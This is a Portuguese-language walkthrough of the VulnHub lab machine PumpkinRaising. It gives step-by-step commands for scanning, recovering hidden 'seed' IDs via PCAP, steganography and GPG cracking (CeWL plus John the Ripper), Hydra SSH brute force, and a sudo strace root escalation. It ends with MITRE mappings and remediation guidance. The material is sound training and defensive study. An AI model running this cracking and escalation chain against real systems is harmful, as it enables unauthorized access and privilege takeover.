# VulnHub Mission Pumpkin v1.0 (2/3): PumpkinRaising — Walkthrough

Vejam só rapaziada!! Quatro sementes de abóbora escondidas em PCAP, esteganografia, arquivo GPG e código Morse — e você precisa plantá-las NA ORDEM CERTA para conseguir um shell. Isso é PumpkinRaising. Não é um boot2root tradicional, é uma corrida de obstáculos que pune a pressa e recompensa quem lê cada linha do código-fonte com atenção. ( ͡° ͜ʖ ͡°)

Obrigado ao Jayanth por criar um desafio que vai te fazer reler o HTML três vezes antes de perceber que a resposta estava bem na sua cara o tempo todo. huahuahua

---

| Campo | Valor |
|-------|-------|
| **Nível** | Iniciante |
| **VM Alvo** | Mission-Pumpkin v1.0: PumpkinRaising |
| **VM Atacante** | Kali Linux 2019.1 |
| **VulnHub** | https://www.vulnhub.com/entry/mission-pumpkin-v10-pumpkinraising,324/ |
| **Técnicas** | Host discovery, Nmap, análise de código-fonte web, decodificação Base64/Base32/Hex/Morse, análise de PCAP, esteganografia (StegoSuite), cracking GPG (JtR + CeWL), login SSH, escape de rbash via strace com SUDO |
| **CVEs** | N/A (desafio de lógica e configuração, sem exploits com CVE) |

> **Dicas do autor:**
> "Identifique 4 sementes de abóbora (4 Flags — Seed IDs) e ganhe acesso ao root para capturar o arquivo Flag.txt final."
> "Lembre-se do Jack? Ele é o único especialista que temos no cultivo de abóboras saudáveis."

---

## Resumo do Ataque

```
[host-discovery: IP exibido no banner da VM ao inicializar]
    |
    v
[nmap: porta 22/SSH + porta 80/HTTP, robots.txt revela caminhos]
    |
    v
[análise de código-fonte: /pumpkin.html, Base32 -> spy.pcap -> strings -> Seed ID 50609]
    |
    v
[comentário hex em /pumpkin.html (linha 148) -> Seed ID 96454]
    |
    v
[underconstruction.html -> jackolantern.gif -> StegoSuite + senhas de note.txt -> Seed ID 86568]
    |
    v
[robots.txt: seed.txt.gpg -> CeWL + JtR regras customizadas -> SEEDWATERSUNLIGHT -> Morse -> Seed ID 69507]
    |
    v
[sementes ordenadas conforme exibição na página: 69507506099645486568 -> SSH como jack]
    |
    v
[rbash + strace via SUDO -> escalonamento de privilégios para root]
    |
    v
[/root/Flag.txt]
```

---

## Metodologia

1. Host discovery pelo banner da VM (sem necessidade de arp-scan)
2. Varredura completa com Nmap (versão, OS, scripts, todas as portas)
3. Análise de código-fonte da aplicação web: quatro camadas de encoding (Base64, Base32, Hex, Morse)
4. Análise de arquivo PCAP com `strings` para extrair o Seed ID 1
5. Extração de esteganografia de imagem GIF com StegoSuite e senha por força bruta
6. Cracking de arquivo GPG com wordlist CeWL + regra customizada no John the Ripper
7. Montagem das quatro Seeds na ordem correta para as credenciais SSH
8. Escape de shell restrito (rbash) via strace com permissão SUDO

---

## Passo 1 — Identificando o Alvo

Mano, essa VM é generosa: ela já mostra o IP no banner de inicialização. Não precisa de arp-scan, não precisa de nmap ping, nada. Assim que a VM sobe, aparece na tela:

```
This machine is up and running at
192.168.10.102
```

Se por acaso você precisar confirmar em outro segmento de rede:

```bash
arp-scan --localnet --ignoredups
# ou
nmap -sn -T5 192.168.X.0/24
```

Neste guia o alvo é `192.168.10.102`. Bora!

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1595.001 Varredura Ativa: Scanning de IPs]

---

## Passo 2 — Reconhecimento e Enumeração de Serviços

Vamos ver o que essa abóbora esconde:

```bash
nmap -A -T4 -p- 192.168.10.102
# -A: detecção de OS, versão de serviço, scripts padrão
# -T4: timing agressivo, seguro em lab local
# -p-: todas as 65535 portas
```

Output esperado:

```
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
80/tcp open  http    Apache httpd
```

Dois serviços: SSH na 22 e HTTP na 80. O Nmap já faz um favor extra aqui: lê o `robots.txt` e expõe alguns caminhos interessantes. Anota aí, vamos precisar deles.

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1595.002 Varredura Ativa] [T1046 Descoberta de Serviços de Rede]

---

## Passo 3 — Análise da Aplicação Web

Abre o browser em `http://192.168.10.102/` ou usa curl:

```bash
curl -s "http://192.168.10.102/"
```

A página mostra quatro imagens de abóbora. Passando o mouse em cada uma, aparece o nome: Big Max, Jack-Be-Little, Acorn e Lil' Pump-Ke-Mon. Guarda esses nomes, precisaremos deles para ordenar as seeds lá na frente.

Tem também um parágrafo assim:

> "To raise Pumpkins, we need to collect seeds at the first step. Remember Jack? He is the only expert we have in raising healthy Pumpkins."

Quatro abóboras, quatro nomes, quatro IDs de sementes para encontrar. E o usuário alvo chama "jack". Beleza, contexto dado.

Agora o código-fonte, que é onde a brincadeira começa de verdade:

```bash
curl -s "http://192.168.10.102/" | grep -n "."
```

Linha 41, um comentário em Base64:

```html
<!-- VGhpcyBpcyBqdXN0IHRvIHJlbWFpbmQgeW91IHRoYXQgaXQncyBMZXZlbCAyIG9mIE1pc3Npb24tUHVtcGtpbiEgOyk= -->
```

```bash
echo "VGhpcyBpcyBqdXN0IHRvIHJlbWFpbmQgeW91IHRoYXQgaXQncyBMZXZlbCAyIG9mIE1pc3Npb24tUHVtcGtpbiEgOyk=" | base64 -d
```

Resultado: `This is just to remind you that it's Level 2 of Mission-Pumpkin! ;)` — nada acionável, só texto de ambientação. Mas a linha 16 traz um link: `/pumpkin.html`. Próxima parada.

---

## Passo 4 — Caçando as 04 Sementes

### Seed ID 1: Jack-Be-Little (PCAP via Base32)

Abre `/pumpkin.html`:

```bash
curl -s "http://192.168.10.102/pumpkin.html" | head -20
```

Linha 12 tem um comentário em Base32:

```
F5ZWG4TJOB2HGL3TOB4S44DDMFYA====
```

Decodifica:

```bash
echo "F5ZWG4TJOB2HGL3TOB4S44DDMFYA====" | base32 -d
```

Resultado: `http://192.168.10.102/scripts/spy.pcap`

Top demais. Baixa e analisa:

```bash
wget -c http://192.168.10.102/scripts/spy.pcap
strings spy.pcap
```

Nem precisa abrir no Wireshark. O `strings` já entrega tudo em texto puro:

```
Sure, 50609 is the ID
```

**Seed ID da Jack-Be-Little: 50609** ᕕ( ᐛ )ᕗ

> **Nota do mundo real:** Arquivos PCAP com credenciais ou dados sensíveis em TCP sem criptografia são um achado clássico em pentests internos. Protocolos legados como FTP, HTTP sem TLS e Telnet ainda são encontrados em ambientes corporativos, especialmente em redes OT/SCADA e sistemas legados. Referência: NIST SP 800-52.

> **MITRE ATT&CK:** [TA0006 Acesso a Credenciais] [T1040 Sniffing de Rede]

---

### Seed ID 2: Acorn Pumpkin (Hex no código-fonte)

Desce até a linha 148 de `/pumpkin.html` — ou joga tudo no curl e procura blocos de dados após várias linhas em branco:

```bash
curl -s "http://192.168.10.102/pumpkin.html"
# rola até o fim ou usa grep para padrões hexadecimais
```

Tem um bloco de conteúdo em HEXADECIMAL enterrado no final da página. Converte para ASCII:

```bash
echo "SEUHEXAQUI" | xxd -r -p
```

A mensagem traz:

**Seed ID da Acorn Pumpkin: 96454** •̀ᴗ•́

E uma dica crucial: `Do, remember to inform Jack to plant all 4 seeds in the same order.` Anota isso.

> **MITRE ATT&CK:** [TA0007 Descoberta] [T1083 Descoberta de Arquivos e Diretórios]

---

### Seed ID 3: Lil' Pump-Ke-Mon (Esteganografia no GIF)

Ainda em `/pumpkin.html`, linha 18 tem outro link: `underconstruction.html`.

```bash
curl -s "http://192.168.10.102/underconstruction.html"
```

A página parece vazia, mas a linha 25 tem uma dica ofuscada:

```
jackolantern dot GraphicsInterchangeFormat is under images
```

Traduzindo: `/images/jackolantern.gif`. Baixa:

```bash
wget http://192.168.10.102/images/jackolantern.gif
```

Tentativa de extração com StegoSuite pede senha:

```bash
stegosuite -x jackolantern.gif
# Senha necessária!
```

O Nmap já nos deu dois arquivos do `robots.txt`:

```
/hidden/note.txt
/seeds/seed.txt.gpg
```

```bash
wget http://192.168.10.102/hidden/note.txt
wget http://192.168.10.102/seeds/seed.txt.gpg
```

O `note.txt` tem pares usuário:senha. Vamos testar todas as senhas dele para extrair o conteúdo da imagem:

```bash
for i in $(gawk -F" : " '{ print $2 }' note.txt | sed '/^$/d'); do
    stegosuite -x jackolantern.gif -k $i
done
```

Uma das senhas funciona. Um novo arquivo é criado: `decorative.txt`:

```bash
cat decorative.txt
```

Resultado: `Fantastic!!! looking forward for your presence in pumpkin party. Lil' Pump-Ke-Mon Pumpkin seeds ID : 86568`

**Seed ID da Lil' Pump-Ke-Mon: 86568** (☞ﾟヮﾟ)☞

> **O que é esteganografia?** É a técnica de esconder dados dentro de outros dados. Aqui, uma mensagem foi embutida nos pixels de um GIF. Diferente de criptografia (que torna o dado ilegível), esteganografia esconde a existência do dado. O grupo APT32 (OceanLotus) usou esteganografia em imagens para esconder comunicações C2 em campanhas APT documentadas.
> Referência: https://attack.mitre.org/techniques/T1027/

> **MITRE ATT&CK:** [TA0005 Evasão de Defesas] [T1027 Arquivos ou Informações Ofuscadas]

---

### Seed ID 4: Big Max Pumpkin (GPG + Código Morse)

O arquivo `seed.txt.gpg` ainda não conseguimos abrir. Tentando as senhas do `note.txt` diretamente não funciona:

```bash
for i in $(gawk -F" : " '{ print $2 }' note.txt | sed '/^$/d'); do
    gpg --batch --passphrase "$i" seed.txt.gpg
done
# Nada. Hora de criar uma wordlist melhor.
```

**Gerando wordlist customizada com CeWL:**

```bash
cewl -d0 -w wordsPumpkin.txt http://192.168.10.102/
cat wordsPumpkin.txt | tail
# Observe as últimas linhas: SEED, WATER, SUNLIGHT — todas em maiúsculas, se destacam!
```

O rodapé da página inicial usa exatamente essas três palavras em maiúsculas. Isso é o padrão. Criamos uma regra customizada no John the Ripper em `/etc/john/john.conf`, logo após `[List.Rules:None]`:

```
[List.Rules:Pumpkin]
$S$E$E$D
$W$A$T$E$R
$S$U$N$L$I$G$H$T
```

Aplica a regra três vezes para gerar combinações:

```bash
for i in {1..3}; do
    john -w=wordsPumpkin.txt --rules=Pumpkin --stdout >> wordsPumpkin.txt
done
```

Extrai o hash GPG para o formato do JtR:

```bash
gpg2john seed.txt.gpg > hashGPGpumpkin
```

Ataque:

```bash
john hashGPGpumpkin --wordlist=wordsPumpkin.txt
```

Wow guys!! A senha é `SEEDWATERSUNLIGHT`. Descriptografa:

```bash
gpg --batch --passphrase SEEDWATERSUNLIGHT seed.txt.gpg
cat seed.txt
```

O conteúdo está em código Morse. A dica no `/pumpkin.html` dizia: `Jack used to purchase seeds from the best-sellers and Morse is one among them.`

Decodifica o Morse em https://morsify.net ou qualquer outro decoder.

**Seed ID da Big Max: 69507** ಠᴗᠠ

---

## Passo 5 — Montando as Credenciais e Acesso SSH

Temos as quatro sementes:

| Abóbora | Seed ID |
|---------|---------|
| Big Max | 69507 |
| Jack-Be-Little | 50609 |
| Acorn | 96454 |
| Lil' Pump-Ke-Mon | 86568 |

A dica dizia: plantar na mesma ordem que aparecem na página inicial. Olhando a homepage, a ordem visual é: Big Max, Jack-Be-Little, Acorn, Lil' Pump-Ke-Mon.

Credenciais finais:

```
Usuário: jack
Senha: 69507506099645486568
```

Usando o Hydra para confirmar (opcional):

```bash
gawk -F" : " '{ print $1 }' note.txt > usuarios.txt
gawk -F" : " '{ print $2 }' note.txt > senhas.txt

hydra -L usuarios.txt -P senhas.txt 192.168.10.102 ssh -I -F
```

Login direto:

```bash
ssh jack@192.168.10.102
```

Estamos dentro como jack! ᕕ( ᐛ )ᕗ

> **MITRE ATT&CK:** [TA0001 Acesso Inicial] [T1078 Contas Válidas] [T1021.004 Serviços Remotos: SSH]

---

## Passo 6 — Escalação de Privilégios via strace (SUDO + escape do rbash)

Ao entrar, perceba: estamos num `rbash` (restricted bash). Alguns comandos estão bloqueados, mas o `PATH` já tem o `strace`. Vamos ver o que o sudo permite:

```bash
sudo -l
```

Resultado: QUALQUER usuário pode executar `strace` sem senha. É tudo que precisamos.

```bash
sudo strace -o /dev/null /bin/bash
```

Shell de root. ¯\_(ツ)_/¯ Clássico GTFOBins.

> **O que é o strace?** É uma ferramenta de diagnóstico Linux que rastreia chamadas de sistema de um processo. Quando liberado via sudo, um atacante pode usá-lo como wrapper para executar qualquer outro processo como root, contornando o shell restrito completamente.
> Referência: https://gtfobins.github.io/gtfobins/strace/

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/Flag.txt
```

**Flag de root capturada!** (☞ﾟヮﾟ)☞

> **MITRE ATT&CK:** [TA0004 Escalação de Privilégios] [T1548.003 Abuso de Mecanismo de Elevação: Sudo]

> **Referência GTFOBins:**
> https://gtfobins.github.io/gtfobins/strace/

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|------|-------|---------------|-----------|
| Seed ID 1 | `50609` | `spy.pcap` (strings) | Jack-Be-Little |
| Seed ID 2 | `96454` | `/pumpkin.html` (comentário hex linha 148) | Acorn |
| Seed ID 3 | `86568` | `jackolantern.gif` (esteganografia) | Lil' Pump-Ke-Mon |
| Seed ID 4 | `69507` | `seed.txt.gpg` (Morse após decrypt GPG) | Big Max |
| Credencial | `jack:69507506099645486568` | sementes ordenadas da página | Login SSH |
| Credencial | `robert:C@43r0VqG2=` | `/hidden/note.txt` | referência |
| Credencial | `mark:Qn@F5zMg4T` | `/hidden/note.txt` | referência |
| Passphrase GPG | `SEEDWATERSUNLIGHT` | CeWL + regra JtR | seed.txt.gpg |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|-------------------------|----------------|
| 1 | Dados sensíveis transmitidos em texto puro via TCP | Comum em sistemas legados (FTP, APIs HTTP antigas, Telnet em OT) | Sempre encriptar dados em trânsito; TLS obrigatório, não só no login |
| 2 | Sudo concedido a ferramenta de diagnóstico sem senha (strace) | Políticas sudo permissivas aparecem em auditorias de hardening Linux o tempo todo | Princípio do menor privilégio; sudo nunca deve liberar wrappers de execução arbitrária |
| 3 | Senha derivada de conteúdo visível na página pública (SEEDWATERSUNLIGHT do rodapé) | Engenharia social e OSINT frequentemente recuperam senhas baseadas em conteúdo da marca | Senhas não podem ser baseadas em nenhuma string visível publicamente ligada ao sistema |
| 4 | Esteganografia para ocultar credenciais em imagem pública | Grupos APT usam esteganografia em imagens para esconder comunicações C2 | Inspecionar todos os assets binários públicos durante resposta a incidentes |

**Por que isso importa fora do laboratório?**

A configuração incorreta do sudo aqui (strace disponível para todos os usuários sem senha) espelha um padrão encontrado em auditorias corporativas reais. O CIS Benchmark para Linux proíbe explicitamente conceder sudo a ferramentas de diagnóstico ou rastreamento. No comprometimento da SolarWinds em 2020, os atacantes se moveram lateralmente usando contas de serviço mal configuradas com direitos sudo excessivos — não CVEs, apenas configuração. Testar `sudo -l` imediatamente após obter qualquer shell é um dos hábitos mais produtivos que um pentester pode desenvolver.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Varredura Ativa: Scanning de Vulnerabilidades | T1595.002 |
| Descoberta | TA0007 | Descoberta de Serviços de Rede | T1046 |
| Descoberta | TA0007 | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | TA0006 | Sniffing de Rede (análise PCAP) | T1040 |
| Acesso a Credenciais | TA0006 | Força Bruta: Adivinhação de Senha (GPG) | T1110.001 |
| Evasão de Defesas | TA0005 | Arquivos ou Informações Ofuscadas (stego/encoding) | T1027 |
| Acesso Inicial | TA0001 | Contas Válidas | T1078 |
| Acesso Inicial | TA0001 | Serviços Remotos Externos (SSH) | T1133 |
| Escalação de Privilégios | TA0004 | Abuso de Mecanismo de Elevação: Sudo | T1548.003 |
| Coleta | TA0009 | Dados do Sistema Local (flag) | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Remover strace (e ferramentas similares) de qualquer política sudo que não exija explicitamente, sem limitar a administradores nomeados
2. Criptografar todos os serviços TCP que lidam com dados sensíveis; protocolos em texto puro devem ser substituídos por equivalentes TLS
3. Nunca derivar senhas de conteúdo visível na interface da aplicação (texto do rodapé, títulos, slogans da marca)
4. Auditar todos os assets binários públicos quanto a conteúdo esteganográfico durante resposta a incidentes
5. Substituir senhas GPG baseadas em padrões adivináveis por secrets gerados aleatoriamente e armazenados em um gerenciador adequado (HashiCorp Vault, AWS Secrets Manager)

### Se Você Encontrar Isso no Seu Ambiente

**Contenção imediata:**
- Revogar e reemitir qualquer credencial SSH que usou senha baseada em padrão
- Remover todas as regras sudo permissivas e regenerar `/etc/sudoers.d/` a partir de um baseline endurecido
- Rotacionar todas as credenciais encontradas em arquivos de texto puro no servidor
- Revisar todos os assets binários públicos quanto a dados embutidos

**Contramedidas MITRE D3FEND:**
- D3-MFA (Autenticação Multifator) para todos os serviços de acesso remoto
- D3-OPS (Isolamento de Processos de OS) para limitar o impacto de processos com privilégios elevados
- D3-SJA (Análise de Jobs Agendados) como passo de hardening complementar junto com auditorias sudo

### Alinhamento com Frameworks

**NIST CSF 2.0:**
- Identificar (ID.AM): Manter inventário preciso de todos os serviços e credenciais expostas
- Proteger (PR.AC-4): Gestão de acesso privilegiado; aplicar menor privilégio nas políticas sudo
- Detectar (DE.CM-7): Monitorar uso incomum de ferramentas de diagnóstico (strace, ltrace, gdb) por contas não-root
- Responder (RS.MI-1): Isolar sistemas afetados e rotacionar todas as credenciais imediatamente após detecção de comprometimento
- Recuperar (RC.RP-1): Restaurar sistemas a partir de backups verificados

**NIST SP 800-53 (Rev. 5):**
- AC-6: Menor Privilégio — restringir sudo ao mínimo necessário
- IA-5: Gestão de Autenticadores — proibir senhas derivadas de padrões
- SC-8: Confidencialidade e Integridade na Transmissão — enforçar TLS
- SI-7: Integridade de Software, Firmware e Informações — detectar dados não autorizados embutidos em assets

**CISA Known Exploited Vulnerabilities:**
- Sem correspondência direta de CVE neste desafio; técnicas são baseadas em configuração
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2:**
- Domínio: ACCESS
- Prática: Gestão de Identidade e Acesso — enforçar menor privilégio, revisar política sudo trimestralmente
- MIL alvo: MIL-2

---

## Considerações Finais

Muito obrigado ao Jayanth por construir um desafio onde você genuinamente precisa prestar atenção. Cada dica no HTML, no output do GPG em Morse, nas palavras-chave do rodapé — nada está ali por acidente. Esta VM é uma aula sobre desacelerar, ler com cuidado e confiar nas pistas.

Fora do laboratório: as técnicas aqui podem parecer brincadeira na superfície (código Morse? sementes de abóbora?), mas as habilidades subjacentes — análise de PCAP, detecção de esteganografia, cracking de GPG, auditoria de política sudo — são absolutamente habilidades do mundo real. Quem faz pentests internos ou avaliações de hardening Linux vai encontrar configurações incorretas de sudo e exposição de credenciais em texto puro com muito mais frequência do que exploits elaborados de kernel.

Se este guia te ajudou a crackear as abóboras, compartilhe com a galera e continue hackeando!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Artigo original em português de André Henrique: https://medium.com/@mrhenrike

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
